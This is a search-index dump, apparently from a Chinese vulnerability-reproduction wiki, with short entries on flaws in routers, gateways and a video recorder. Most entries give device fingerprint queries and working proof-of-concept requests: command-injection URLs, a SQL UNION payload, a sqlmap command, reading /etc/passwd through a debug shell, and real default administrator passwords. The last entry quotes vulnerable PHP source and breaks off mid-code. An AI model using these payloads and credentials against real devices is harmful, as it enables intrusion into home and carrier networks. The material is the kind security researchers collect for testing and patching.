","date":"0001-01-01","objectID":"/%E6%B5%99%E6%B1%9F%E5%AE%87%E8%A7%86%E7%A7%91%E6%8A%80-%E7%BD%91%E7%BB%9C%E8%A7%86%E9%A2%91%E5%BD%95%E5%83%8F%E6%9C%BA-isc-logreport.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E6%B5%99%E6%B1%9F%E5%AE%87%E8%A7%86%E7%A7%91%E6%8A%80-%E7%BD%91%E7%BB%9C%E8%A7%86%E9%A2%91%E5%BD%95%E5%83%8F%E6%9C%BA-isc-logreport.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 浙江宇视科技 网络视频录像机 ISC /Interface/LogReport/LogReport.php 页面，fileString 参数过滤不严格，导致攻击者可执行任意命令 ","date":"0001-01-01","objectID":"/%E6%B5%99%E6%B1%9F%E5%AE%87%E8%A7%86%E7%A7%91%E6%8A%80-%E7%BD%91%E7%BB%9C%E8%A7%86%E9%A2%91%E5%BD%95%E5%83%8F%E6%9C%BA-isc-logreport.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E6%B5%99%E6%B1%9F%E5%AE%87%E8%A7%86%E7%A7%91%E6%8A%80-%E7%BD%91%E7%BB%9C%E8%A7%86%E9%A2%91%E5%BD%95%E5%83%8F%E6%9C%BA-isc-logreport.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 浙江宇视科技 网络视频录像机 ISC ","date":"0001-01-01","objectID":"/%E6%B5%99%E6%B1%9F%E5%AE%87%E8%A7%86%E7%A7%91%E6%8A%80-%E7%BD%91%E7%BB%9C%E8%A7%86%E9%A2%91%E5%BD%95%E5%83%8F%E6%9C%BA-isc-logreport.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E6%B5%99%E6%B1%9F%E5%AE%87%E8%A7%86%E7%A7%91%E6%8A%80-%E7%BD%91%E7%BB%9C%E8%A7%86%E9%A2%91%E5%BD%95%E5%83%8F%E6%9C%BA-isc-logreport.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"uniview-ISC\" ","date":"0001-01-01","objectID":"/%E6%B5%99%E6%B1%9F%E5%AE%87%E8%A7%86%E7%A7%91%E6%8A%80-%E7%BD%91%E7%BB%9C%E8%A7%86%E9%A2%91%E5%BD%95%E5%83%8F%E6%9C%BA-isc-logreport.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E6%B5%99%E6%B1%9F%E5%AE%87%E8%A7%86%E7%A7%91%E6%8A%80-%E7%BD%91%E7%BB%9C%E8%A7%86%E9%A2%91%E5%BD%95%E5%83%8F%E6%9C%BA-isc-logreport.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC /Interface/LogReport/LogReport.php?action=execUpdate\u0026fileString=x;id\u003e1.txt ","date":"0001-01-01","objectID":"/%E6%B5%99%E6%B1%9F%E5%AE%87%E8%A7%86%E7%A7%91%E6%8A%80-%E7%BD%91%E7%BB%9C%E8%A7%86%E9%A2%91%E5%BD%95%E5%83%8F%E6%9C%BA-isc-logreport.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E6%B5%99%E6%B1%9F%E5%AE%87%E8%A7%86%E7%A7%91%E6%8A%80-%E7%BD%91%E7%BB%9C%E8%A7%86%E9%A2%91%E5%BD%95%E5%83%8F%E6%9C%BA-isc-logreport.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"烽火 HG6245D info.asp 信息泄露漏洞 ","date":"0001-01-01","objectID":"/%E7%83%BD%E7%81%AB-hg6245d-info.asp-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E7%83%BD%E7%81%AB-hg6245d-info.asp-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 烽火 HG6245D info.asp页面存在信息泄露漏洞，通过漏洞可获取内网连接用户MAC地址以及系统运行状态 ","date":"0001-01-01","objectID":"/%E7%83%BD%E7%81%AB-hg6245d-info.asp-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E7%83%BD%E7%81%AB-hg6245d-info.asp-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 烽火 HG6245D ","date":"0001-01-01","objectID":"/%E7%83%BD%E7%81%AB-hg6245d-info.asp-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E7%83%BD%E7%81%AB-hg6245d-info.asp-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"360 Quake html_hash:\"636e5c0d28c6b7401ce36eed34c461ca\" ","date":"0001-01-01","objectID":"/%E7%83%BD%E7%81%AB-hg6245d-info.asp-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E7%83%BD%E7%81%AB-hg6245d-info.asp-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 访问 info.asp 页面 获取泄漏信息 ","date":"0001-01-01","objectID":"/%E7%83%BD%E7%81%AB-hg6245d-info.asp-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E7%83%BD%E7%81%AB-hg6245d-info.asp-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"电信 中兴ZXHN F450A网关 默认管理员账号密码漏洞 ","date":"0001-01-01","objectID":"/%E7%94%B5%E4%BF%A1-%E4%B8%AD%E5%85%B4zxhn-f450a%E7%BD%91%E5%85%B3-%E9%BB%98%E8%AE%A4%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E7%94%B5%E4%BF%A1-%E4%B8%AD%E5%85%B4zxhn-f450a%E7%BD%91%E5%85%B3-%E9%BB%98%E8%AE%A4%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 电信中兴ZXHN F450A网关 存在默认管理员账号密码 ","date":"0001-01-01","objectID":"/%E7%94%B5%E4%BF%A1-%E4%B8%AD%E5%85%B4zxhn-f450a%E7%BD%91%E5%85%B3-%E9%BB%98%E8%AE%A4%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E7%94%B5%E4%BF%A1-%E4%B8%AD%E5%85%B4zxhn-f450a%E7%BD%91%E5%85%B3-%E9%BB%98%E8%AE%A4%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 电信中兴ZXHN F450A网关 ","date":"0001-01-01","objectID":"/%E7%94%B5%E4%BF%A1-%E4%B8%AD%E5%85%B4zxhn-f450a%E7%BD%91%E5%85%B3-%E9%BB%98%E8%AE%A4%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E7%94%B5%E4%BF%A1-%E4%B8%AD%E5%85%B4zxhn-f450a%E7%BD%91%E5%85%B3-%E9%BB%98%E8%AE%A4%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 ZXHN F450A ","date":"0001-01-01","objectID":"/%E7%94%B5%E4%BF%A1-%E4%B8%AD%E5%85%B4zxhn-f450a%E7%BD%91%E5%85%B3-%E9%BB%98%E8%AE%A4%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E7%94%B5%E4%BF%A1-%E4%B8%AD%E5%85%B4zxhn-f450a%E7%BD%91%E5%85%B3-%E9%BB%98%E8%AE%A4%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 登录页面如下 user/pass useradmin/nE7jA%5m 普通管理员 telecomadmin/nE7jA%5m 超级管理员 ","date":"0001-01-01","objectID":"/%E7%94%B5%E4%BF%A1-%E4%B8%AD%E5%85%B4zxhn-f450a%E7%BD%91%E5%85%B3-%E9%BB%98%E8%AE%A4%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E7%94%B5%E4%BF%A1-%E4%B8%AD%E5%85%B4zxhn-f450a%E7%BD%91%E5%85%B3-%E9%BB%98%E8%AE%A4%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"电信 天翼网关F460 web_shell_cmd.gch 远程命令执行漏洞 ","date":"0001-01-01","objectID":"/%E7%94%B5%E4%BF%A1-%E5%A4%A9%E7%BF%BC%E7%BD%91%E5%85%B3f460-web_shell_cmd.gch-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E7%94%B5%E4%BF%A1-%E5%A4%A9%E7%BF%BC%E7%BD%91%E5%85%B3f460-web_shell_cmd.gch-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 电信天翼网关F460 web_shell_cmd.gch文件存在命令调试界面，攻击者可以利用获取服务器权限 ","date":"0001-01-01","objectID":"/%E7%94%B5%E4%BF%A1-%E5%A4%A9%E7%BF%BC%E7%BD%91%E5%85%B3f460-web_shell_cmd.gch-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E7%94%B5%E4%BF%A1-%E5%A4%A9%E7%BF%BC%E7%BD%91%E5%85%B3f460-web_shell_cmd.gch-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 电信天翼网关F460 ","date":"0001-01-01","objectID":"/%E7%94%B5%E4%BF%A1-%E5%A4%A9%E7%BF%BC%E7%BD%91%E5%85%B3f460-web_shell_cmd.gch-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E7%94%B5%E4%BF%A1-%E5%A4%A9%E7%BF%BC%E7%BD%91%E5%85%B3f460-web_shell_cmd.gch-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title=\"F460\" ","date":"0001-01-01","objectID":"/%E7%94%B5%E4%BF%A1-%E5%A4%A9%E7%BF%BC%E7%BD%91%E5%85%B3f460-web_shell_cmd.gch-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E7%94%B5%E4%BF%A1-%E5%A4%A9%E7%BF%BC%E7%BD%91%E5%85%B3f460-web_shell_cmd.gch-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 出现漏洞的文件为 web_shell_cmd.gch 直接输入命令就可以执行 cat /etc/passwd ","date":"0001-01-01","objectID":"/%E7%94%B5%E4%BF%A1-%E5%A4%A9%E7%BF%BC%E7%BD%91%E5%85%B3f460-web_shell_cmd.gch-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E7%94%B5%E4%BF%A1-%E5%A4%A9%E7%BF%BC%E7%BD%91%E5%85%B3f460-web_shell_cmd.gch-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"电信 网关配置管理系统 login.php SQL注入漏洞 ","date":"0001-01-01","objectID":"/%E7%94%B5%E4%BF%A1-%E7%BD%91%E5%85%B3%E9%85%8D%E7%BD%AE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-login.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E7%94%B5%E4%BF%A1-%E7%BD%91%E5%85%B3%E9%85%8D%E7%BD%AE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-login.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 电信网关配置管理系统 前台登陆页面用户名参数存在SQL注入漏洞 ","date":"0001-01-01","objectID":"/%E7%94%B5%E4%BF%A1-%E7%BD%91%E5%85%B3%E9%85%8D%E7%BD%AE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-login.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E7%94%B5%E4%BF%A1-%E7%BD%91%E5%85%B3%E9%85%8D%E7%BD%AE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-login.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 电信网关配置管理系统 ","date":"0001-01-01","objectID":"/%E7%94%B5%E4%BF%A1-%E7%BD%91%E5%85%B3%E9%85%8D%E7%BD%AE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-login.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E7%94%B5%E4%BF%A1-%E7%BD%91%E5%85%B3%E9%85%8D%E7%BD%AE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-login.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 body=\"src=\"img/dl.gif\"\" \u0026\u0026 title=\"系统登录\" ","date":"0001-01-01","objectID":"/%E7%94%B5%E4%BF%A1-%E7%BD%91%E5%85%B3%E9%85%8D%E7%BD%AE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-login.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E7%94%B5%E4%BF%A1-%E7%BD%91%E5%85%B3%E9%85%8D%E7%BD%AE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-login.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面如下 设备存在默认弱口令 admin/admin 登录的请求包为 POST /manager/login.php HTTP/1.1 Host: xxx.xxx.xxx.xxx Content-Length: 53 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.128 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: PHPSESSID=2lfi6enp5gehalrb92594c80i6 Connection: close Name=admin\u0026Pass=admin 保存为文件使用 Sqlmap工具，注入点为 Name参数 sqlmap -r sql-1.txt -p Name --risk 3 ","date":"0001-01-01","objectID":"/%E7%94%B5%E4%BF%A1-%E7%BD%91%E5%85%B3%E9%85%8D%E7%BD%AE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-login.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E7%94%B5%E4%BF%A1-%E7%BD%91%E5%85%B3%E9%85%8D%E7%BD%AE%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-login.php-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"百为通达 智能流控路由器 open 远程命令执行漏洞 ","date":"0001-01-01","objectID":"/%E7%99%BE%E4%B8%BA%E9%80%9A%E8%BE%BE-%E6%99%BA%E8%83%BD%E6%B5%81%E6%8E%A7%E8%B7%AF%E7%94%B1%E5%99%A8-open-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E7%99%BE%E4%B8%BA%E9%80%9A%E8%BE%BE-%E6%99%BA%E8%83%BD%E6%B5%81%E6%8E%A7%E8%B7%AF%E7%94%B1%E5%99%A8-open-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 BYTEVALUE 百为流控路由器是一款追求带宽利用率的多功能路由器。百为智能流控路由器 /goform/webRead/open 路由存在有回显的命令注入漏洞。 ","date":"0001-01-01","objectID":"/%E7%99%BE%E4%B8%BA%E9%80%9A%E8%BE%BE-%E6%99%BA%E8%83%BD%E6%B5%81%E6%8E%A7%E8%B7%AF%E7%94%B1%E5%99%A8-open-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E7%99%BE%E4%B8%BA%E9%80%9A%E8%BE%BE-%E6%99%BA%E8%83%BD%E6%B5%81%E6%8E%A7%E8%B7%AF%E7%94%B1%E5%99%A8-open-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 百为通达 智能流控路由器 ","date":"0001-01-01","objectID":"/%E7%99%BE%E4%B8%BA%E9%80%9A%E8%BE%BE-%E6%99%BA%E8%83%BD%E6%B5%81%E6%8E%A7%E8%B7%AF%E7%94%B1%E5%99%A8-open-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E7%99%BE%E4%B8%BA%E9%80%9A%E8%BE%BE-%E6%99%BA%E8%83%BD%E6%B5%81%E6%8E%A7%E8%B7%AF%E7%94%B1%E5%99%A8-open-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 \"BYTEVALUE 智能流控路由器\" ","date":"0001-01-01","objectID":"/%E7%99%BE%E4%B8%BA%E9%80%9A%E8%BE%BE-%E6%99%BA%E8%83%BD%E6%B5%81%E6%8E%A7%E8%B7%AF%E7%94%B1%E5%99%A8-open-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E7%99%BE%E4%B8%BA%E9%80%9A%E8%BE%BE-%E6%99%BA%E8%83%BD%E6%B5%81%E6%8E%A7%E8%B7%AF%E7%94%B1%E5%99%A8-open-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登陆页面 poc GET /goform/webRead/open/?path=|id HTTP/1.1 Host: ","date":"0001-01-01","objectID":"/%E7%99%BE%E4%B8%BA%E9%80%9A%E8%BE%BE-%E6%99%BA%E8%83%BD%E6%B5%81%E6%8E%A7%E8%B7%AF%E7%94%B1%E5%99%A8-open-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E7%99%BE%E4%B8%BA%E9%80%9A%E8%BE%BE-%E6%99%BA%E8%83%BD%E6%B5%81%E6%8E%A7%E8%B7%AF%E7%94%B1%E5%99%A8-open-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"百卓 Patflow showuser.php 后台SQL注入漏洞 ","date":"0001-01-01","objectID":"/%E7%99%BE%E5%8D%93-patflow-showuser.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E7%99%BE%E5%8D%93-patflow-showuser.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 百卓 Patflow showuser.php文件参数过滤不充分，导致后台存在SQL注入漏洞 ","date":"0001-01-01","objectID":"/%E7%99%BE%E5%8D%93-patflow-showuser.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E7%99%BE%E5%8D%93-patflow-showuser.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 百卓 Patflow ","date":"0001-01-01","objectID":"/%E7%99%BE%E5%8D%93-patflow-showuser.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E7%99%BE%E5%8D%93-patflow-showuser.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 \"Patflow\" ","date":"0001-01-01","objectID":"/%E7%99%BE%E5%8D%93-patflow-showuser.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E7%99%BE%E5%8D%93-patflow-showuser.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 默认口令登录后台 admin/admin 存在漏洞的文件为 shwouser.php,验证POC为 /user/showuser.php?id=1%20union%20select%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,(select%20group_concat(SCHEMA_NAME)%20f ","date":"0001-01-01","objectID":"/%E7%99%BE%E5%8D%93-patflow-showuser.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E7%99%BE%E5%8D%93-patflow-showuser.php-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"百卓 Smart importhtml.php 远程命令执行漏洞 ","date":"0001-01-01","objectID":"/%E7%99%BE%E5%8D%93-smart-importhtml.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E7%99%BE%E5%8D%93-smart-importhtml.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 百卓 importhtml.php文件sql语句无过滤，通过Sql语句可远程命令执行 ","date":"0001-01-01","objectID":"/%E7%99%BE%E5%8D%93-smart-importhtml.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E7%99%BE%E5%8D%93-smart-importhtml.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 百卓 Smart ","date":"0001-01-01","objectID":"/%E7%99%BE%E5%8D%93-smart-importhtml.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E7%99%BE%E5%8D%93-smart-importhtml.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title=\"Smart管理平台\" ","date":"0001-01-01","objectID":"/%E7%99%BE%E5%8D%93-smart-importhtml.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E7%99%BE%E5%8D%93-smart-importhtml.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 出现漏洞的文件 importhtml.php \u003c?php include_once(\"global.func.php\"); if($_SESSION['language']!=\"english\") { require_once (\"include/language_cn.php\"); } else { require_once (\"include/language_en.php\"); } if(isset($_GET['type'])) $get_type = $_GET['type']; if(isset($_GET['tab'])) $get_tab = $_GET['tab']; if(isset($_GET['sql'])) $get_sql = $_GET['sql']; if($get_type == \"exporthtmlpost\") { $get_tab = $arr_export_cn[$get_tab]; exportHtml(\"$get_tab\",stripslashes(base64_decode($get_sql))); } elseif($get_type == \"exporthtmlchat\") { $get_tab = $arr_export_cn[$get_tab]; exportHtmlChat(\"$get_tab\",stripslashes(base64_decode($get_sql))); } elseif($get_type == \"exporthtmlmail\") { $get_tab = $arr_export_cn[$get_tab]; exportHtmlMail(\"$get_tab\",stripslashes(base64_decode($get_sql))); } elseif($get_type == \"exporthtmlwebsend\") { $get_tab = $arr_export_cn[$get_tab]; exportHtmlWebSend(\"$get_tab\",stripslashes(base64_decode($get_sql))); } elseif($get_type == \"exporthtmlwebrecv\") { $get_tab = $arr_export_cn[$get_tab]; exportHtmlWebRecv(\"$get_tab\",stripslashes(base64_decode($get_sql))); } ?\u003e 跟踪exportHtmlMail函数 function exportHtmlMail($filename,$sql){ Header( \"Expires: 0\" ); Header( \"Pragma: public\" ); Header( \"Cache-Control: must-revalidate, post-check=0, pre-check=0\" ); Header( \"Cache-Control: public\"); Header( \"Content-Type: application/octet-stream\" ); header(\"Accept-Ranges: bytes\"); header(\"Content-Disposition: attachment; filename=$filename.html\"); echo \"\u003chtml\u003e\\n\"; echo \"\u003chead\u003e\u003ctitle\u003e报表\u003c/title\u003e\u003c/head\u003e\\n\"; echo \"\u003cbody\u003e\\n\"; $conn = connOther(); $result = mysql_query($sql,$conn); while ($data= mysql_fetch_array($result)){ $post_content = \"\"; if($data['mail_file_path'] == \"(null)\"){ $post_content = \"\u003cfont color=red\u003e内容审计未启用\u003c/font\u003e\"; } else{ $post_filename=$data['mail_file_path']; $ifother = \"\"; $ifother = ifExistOther($post_filename); 